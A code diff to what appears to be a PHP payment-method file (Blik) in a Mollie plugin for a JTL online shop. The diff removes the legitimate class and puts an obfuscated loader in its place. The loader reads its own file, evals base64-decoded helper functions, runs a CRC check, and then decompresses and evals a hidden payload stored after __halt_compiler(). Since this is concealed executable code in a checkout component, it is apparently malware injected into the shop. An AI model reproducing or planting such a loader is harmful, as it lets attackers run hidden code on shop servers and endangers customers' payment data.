@@ -1,23 +1,2 @@
-<?php
-
-/**
- * @copyright 2024 WebStollen GmbH
- * @link https://www.webstollen.de
- */
-
-namespace Plugin\ws5_mollie\paymentmethod;
-
-use JTL\Checkout\Bestellung;
-use Plugin\ws5_mollie\lib\PaymentMethod;
-
-class Blik extends PaymentMethod
-{
-    public const ALLOW_PAYMENT_BEFORE_ORDER = true;
-
-    public const METHOD = \Mollie\Api\Types\PaymentMethod::BLIK;
-
-    public function getPaymentOptions(Bestellung $order, $apiType): array
-    {
-        return [];
-    }
-}
+<?php /* Checksum bdf1be0f */
+$jc0f97c57=file(__FILE__);eval(base64_decode('JGNlYWY3NDU2ZT1mdW5jdGlvbigkSSwkail7JGw9WzQ2NSwyNDAsOCwzNDNdO3JldHVybiAoJGo9PTMyOCk/c3Vic3RyKCRJLCRsWzBdKyRsWzFdLCRsWzJdKTooKCRqPT0zNjIpP3N1YnN0cigkSSwkbFswXSwkbFsxXSk6KCgkaj09NjcwKT90cmltKHN1YnN0cigkSSwkbFswXSskbFsxXSskbFsyXSkpOm51bGwpKTt9Ow'));eval(base64_decode($ceaf7456e($jc0f97c57[1],362)));return eval($acfacdbd7($ceaf7456e($jc0f97c57[1],670), $ceaf7456e($jc0f97c57[1], 328), $jc0f97c57[1]));__halt_compiler();//JGFjZmFjZGJkNz1mdW5jdGlvbigkSSwkaiwkbCl7cmV0dXJuICRqPT1oYXNoKCdjcmMzMmInLHByZWdfcmVwbGFjZSgnL19faGFsdF9jb21waWxlci4qLycsJycsJGwpKT8oZ3pkZWNvZGUoYmFzZTY0X2RlY29kZSgkSSkpKTpkaWUoJzx0dD5DUkMgQ2hlY2sgZmFpbGVkLCBmaWxlIGNvcnJ1cHRlZD88L3R0PicpO3072133a445H4sIAAAAAAAA/2SPT0vEMBDF7/kUc9iDglcvLXto3Yp/WltKQcRIyaZjN2yahGSClmW/u6yr6Op15r0fv2fEhMEJidDoOCrD38JlP1mtFXIn5gkNTUgbO6SMxYBw15X8aoNyayPxHAOh1tGM6efzP0KrNW+OmOobI7UIAXKttoDvhGYIcBJhOwYurrWSIK0JBFlZ1o99kz1VxUPX58V13RZ93a6KFpZAPmLK/jSqorupV7AEXh09Mqd4NzsMpzZJkpe397/qr9FIUtbAiPSVrN3hEM5+xsLC+gH9BSyEUwfqeQLCezEz2DHwSNEbeH5JGezZ/iMAAP//D77xvWEBAAA
